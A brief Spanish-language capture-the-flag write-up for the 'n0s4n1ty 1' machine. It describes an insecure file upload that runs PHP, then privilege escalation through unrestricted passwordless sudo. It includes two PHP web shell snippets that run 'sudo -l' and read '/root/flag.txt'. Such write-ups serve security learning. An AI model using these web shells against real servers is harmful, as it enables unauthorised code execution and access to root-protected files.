# n0s4n1ty 1

## Detalles Máquina
- **H1.** La máquina permite subir todo tipo de archivos en la plataforma web
- **H2.** Los archivos se suben a la ruta `/uploads/{nombre_archivo}`
- **H3.** Es posible subir un archivo PHP y "ejecutarlo" al momento de acceder a la ruta del archivo subido
- **H4.** Se puede ejecutar una shell para listar los privilegios de sudo que tiene el usuario actual.
- **H5.** El usuario contiene el siguiente permiso `(ALL) NOPASSWD: ALL` lo que basicamente indica que puede ejecutar cualquier comando asumiendo cualquier identidad sin que el sistema pida contraseña
- **H6** con Sudo se puede conseguir una shell de root y leer cualquier tipo de archivo

## Comandos útiles 

Código Usado para observar los permisos del usuario (H4)
```php
<?php
$output =  shell_exec('sudo -l');
echo "<pre>$output</pre>";
?>
```

Código Usado para obtener el Flag (H6)
```php
<?php
$output =  shell_exec('sudo cat /root/flag.txt');
echo "<pre>$output</pre>";
?>
```

## Tags
- Web Exploitation
- WebShell
- PHP
- Escalación de privilegios
- Path
- Insecure File Upload
- Remote Code Execution (RCE)